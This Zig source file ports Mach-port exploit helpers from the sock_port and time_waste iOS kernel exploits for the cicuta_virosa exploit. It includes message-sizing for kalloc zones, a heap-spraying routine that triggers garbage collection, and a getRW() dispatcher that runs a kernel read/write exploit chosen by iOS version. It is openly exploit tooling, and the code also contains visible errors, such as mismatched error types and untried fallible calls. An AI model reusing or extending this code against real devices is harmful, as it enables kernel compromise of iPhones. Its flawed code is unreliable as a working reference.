// Port of "exploit_utilities" from Jake James' sock_port and time_waste (for cicuta_virosa).
// Some extra utilities added as well.

const c = @cImport({
    @cInclude("mach/mach.h");
    @cInclude("sched.h");
});

const cicuta_virosa = @import("cicuta_virosa.zig");

const versioning = @import("../versioning.zig");
const utils = @import("../utils.zig");

const std = @import("std");

// time_waste
pub const OOLMessage = struct {
    header: c.mach_msg_header_t,
    body: c.mach_msg_body_t,
    ool_ports: c.mach_msg_ool_ports_descriptor_t,
};

// time_waste
pub const SimpleMessage = struct {
    header: c.mach_msg_header_t,
    body: [0]u8,
};

pub const NewMachPortError = error {
    AllocationFailed,
    InsertRightFailed,
    QueueLimitIncreaseFailed,
};

// time_waste
pub fn newMachPort() NewMachPortError!c.mach_port_t {
    var port = c.MACH_PORT_NULL;
    var err = c.mach_port_allocate(
        c.mach_task_self(),
        c.MACH_PORT_RIGHT_RECEIVE,
        &port,
    );
    if (err) {
        utils.errorf("failed to allocate port: 0x{x}.", .{err});
        return NewMachPortError.AllocationFailed;
    }

    err = c.mach_port_insert_right(
        c.mach_task_self(),
        port,
        port,
        c.MACH_MSG_TYPE_MAKE_SEND,
    );
    if (err) {
        utils.errorf("failed to insert right: 0x{x}.", .{err});
        c.mach_port_destroy(c.mach_task_self(), port);
        return NewMachPortError.InsertRightFailed;
    }

    var limits = c.mach_port_limits_t{0};
    limits.mpl_qlimit = c.MACH_PORT_QLIMIT_LARGE;
    err = c.mach_port_set_attributes(
        c.mach_task_self(),
        port,
        c.MACH_PORT_LIMITS_INFO,
        @ptrCast(c.mach_port_info_t, &limits),
        c.MACH_PORT_LIMITS_INFO_COUNT,
    );
    if (err) {
        utils.errorf("failed to increase queue limit: 0x{x}.", .{err});
        c.mach_port_destroy(c.mach_task_self(), port);
        return NewMachPortError.QueueLimitIncreaseFailed;
    }

    return port;
}

pub const SendMessageError = error {
    AllocationFailed,
    SendFailed,
};

// time_waste
pub fn sendMessage(dst: c.mach_port_t, body: []u8) SendMessageError!void {
    var msg_size = body.len + @sizeOf(SimpleMessage);
    var msg = @ptrCast(*SimpleMessage, utils.alloc.alloc(u8, msg_size) catch return ReceiveMessageError.AllocationFailed);
    std.mem.set(u8, @ptrCast([]u8, msg), 0);

    msg.header.msgh_remote_port = dst;
    msg.header.msgh_local_port = c.MACH_PORT_NULL;
    msg.header.msgh_bits = c.MACH_MSGH_BITS(c.MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.header.msgh_size = body.len;

    var err = c.mach_msg(&msg.header, c.MACH_SEND_MSG, msg_size, 0, c.MACH_PORT_NULL, c.MACH_MSG_TIMEOUT_NONE, c.MACH_PORT_NULL);

    utils.alloc.free(@ptrCast([]u8, msg));

    if (err) {
        utils.errorf("failed to send message: 0x{x}.", .{err});
        c.mach_port_destroy(c.mach_task_self(), dst);
        return ReceiveMessageError.SendFailed;
    }
}

pub const ReceiveMessageError = error {
    InvalidMessageType,
    AllocationFailed,
    ReceiveFailed,
};

// time_waste
pub fn receiveMessage(src: c.mach_port_t, comptime T: type) ReceiveMessageError!*T {
    if (!@hasField(T, "header")) {
        return ReceiveMessageError.InvalidMessageType;
    }

    var msg_size = @sizeOf(T);
    var msg = @ptrCast(*T, utils.alloc.alloc(u8, msg_size) catch return ReceiveMessageError.AllocationFailed);
    std.mem.set(u8, @ptrCast([]u8, msg), 0);

    var err = c.mach_msg(&msg.header, c.MACH_RCV_MSG, 0, msg_size, src, c.MACH_MSG_TIMEOUT_NONE, c.MACH_PORT_NULL);

    if (err) {
        utils.errorf("failed to receive message: 0x{x}.", .{err});
        return ReceiveMessageError.ReceiveFailed;
    }

    return msg;
}

// time_waste
pub inline fn messageSizeForKallocSize(comptime kalloc_size: comptime_int) comptime_int {
    return ((3 * kalloc_size) / 4) - 0x74;
}

// time_waste
pub fn triggerGC() !void {
    const gc_ports_cnt = 1000;
    var gc_ports_max = gc_ports_cnt;
    var gc_ports = [1]c.mach_port_t{0} ** gc_ports_cnt;

    const body_size = messageSizeForKallocSize(16384) - @sizeOf(SimpleMessage);
    var body = [1]u8{0x41} ** body_size;

    var i: usize = 0;
    while (i < gc_ports_cnt) : (i += 1) {
        var t0 = c.mach_absolute_time();

        gc_ports[i] = newMachPort();
        try sendMessage(gc_ports[i], &body);

        var t1 = c.mach_absolute_time();

        if (t1 - t0 > 1000000) {
            utils.infof("got GC at {}. breaking...", .{i});
            gc_ports_max = i;
            break;
        }
    }

    i = 0;
    while (i < gc_ports_max) : (i += 1) {
        c.mach_port_destroy(c.mach_task_self(), gc_ports[i]);
    }

    c.sched_yield();
    std.time.sleep(std.time.ns_per_s);
}

pub fn getRW() !void {
    if (versioning.current.inRangeInclusive(.{9,0,0}, .{9,3,4})) {
        // Trident
    } else if (versioning.current.inRangeInclusive(.{9,3,5}, .{9,3,6})) {
        // phoenix
    } else if (versioning.current.inRangeExclusive(.{9,3,6}, .{12,0,0})) {
        // sock_port
    } else if (versioning.current.inRangeInclusive(.{12,0,0}, .{14,3,0})) {
        try cicuta_virosa.exploit();
    } else if (versioning.current.inRangeExclusive(.{14,3,0}, .{14,7,1})) {
        // IOMFB
    } else if (versioning.current.inRangeInclusive(.{15,0,0}, .{15,1,1})) {
        // desc_race OR multicast_bytecopy
    }
}
